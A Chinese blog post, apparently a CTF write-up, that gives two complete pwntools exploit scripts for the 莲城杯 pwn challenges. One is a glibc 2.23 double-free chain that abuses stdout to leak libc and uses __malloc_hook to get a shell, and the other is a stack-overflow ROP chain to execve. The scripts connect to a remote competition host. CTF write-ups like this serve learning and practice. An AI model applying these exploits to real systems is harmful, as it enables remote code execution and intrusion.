---
title: 莲城杯pwn
date: 2021-10-15 17:33:59
tags:
    - 2.23攻_IO_stdout
    - double_free
---
> 这个我们队拿到了第四，当然也是并列第一，其中的pwn是我代为解出来的。说实话不太难，pwn也拿到血了。
###  free_free_free

* 利用`unsorted bin`的指针残留，爆破stdout，1/16的可能。
* 利用[`fastbin 错位`](https://giles-one.github.io/2021/09/04/fastbin-size%E9%94%99%E4%BD%8D%E6%9E%84%E9%80%A0%E5%8F%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/)先申请到`stdout-0x43`，后申请到`malloc_hook-0x23`。
* 利用`realloc`调节栈帧，one-gadget获取shell。

```python
#!/usr/bin/env python
from pwn import *

local = 0
debug = 0
binary = "./free_free_free"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    # p = process(binary)
    libc = ELF(lib)
else :
    # p = remote("183.129.189.60","10023")
    # lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

def add(size,content):
	sal("> ","1")
	sal("size> ",str(size))
	sa("message> ",content)
def free(id):
	sal("> ","2")
	sal("idx> ",str(id))
def pwn():
	add(0x78+1,"0"*8)
	add(0x60,"1"*8)
	add(0x60,"2"*8)
	free(0)
	add(0x18,"3"*8)
	add(0x60,"\xdd\x65") 
	free(2)
	free(1)
	free(2)
	add(0x60,chr(0x20)) 
	add(0x60,"tmp")     
	add(0x60,"tmp")     
	# raw_input()
	add(0x60,"tmp")     
	payload = ""
	payload += chr(0)*(0x33)
	payload += p64(0xfbad3887)
	payload += p64(0)*3
	payload += "\x88"   #_chain filed
	add(0x68,payload)     

	libc.address = r7f()-libc.sym["_IO_2_1_stdin_"]
	info("libc basse => 0x%x"%libc.address)

	ogg = [trs(_) for _ in (0x45226,0x4527a,0xf03a4,0xf1247)]
	og  = ogg[1]

	free(2)
	free(1)
	free(2)
	add(0x60,p64(libc.sym["__malloc_hook"]-0x23)) 
	add(0x60,"tmp")     
	add(0x60,"tmp")     
	payload = ""
	payload += chr(0)*(0x13-8)
	payload += p64(og)
	payload += p64(libc.sym["realloc"]+16)
	add(0x68,payload)    
	sl("1")
	sl("17")
while  True:
	try:
		# p = process(binary)
		p = remote("183.129.189.60","10023")
		pwn()
		break
	except:
		p.close()
raw_input("[*] get shell")
sh()
# DASCTF{7a95efe41004077a790d234f5b90c343}

```
### pwn10

* 一个不太难的栈溢出
  
```python
#!/usr/bin/env python
from pwn import *

local = 0
debug = 1
binary = "./pwn10"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote("183.129.189.60","10016")
    # lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

rop = ""
rop += p64(0x00000000004016e6) # 0x00000000004016e6: pop rdi; ret; 
rop += p64(0x00000000006ccd60)
rop += p64(0x0000000000401807) # 0x0000000000401807: pop rsi; ret; 
rop += p64(0x0000000000000000)
rop += p64(0x0000000000442d16) # 0x0000000000442d16: pop rdx; ret; 
rop += p64(0x0000000000000000)
rop += p64(0x000000000041f884) # 0x000000000041f884: pop rax; ret; 
rop += p64(0x000000000000003b)
rop += p64(0x00000000004679a5) # 0x00000000004679a5: syscall; ret; 

raw_input()
payload = "/bin/sh\x00"
payload += "A"*0x70
payload += rop
payload += "A"*0x100


sl(payload)
sh()
# DASCTF{c7d94ca4c9a02a430d8c677cbaea192b}
```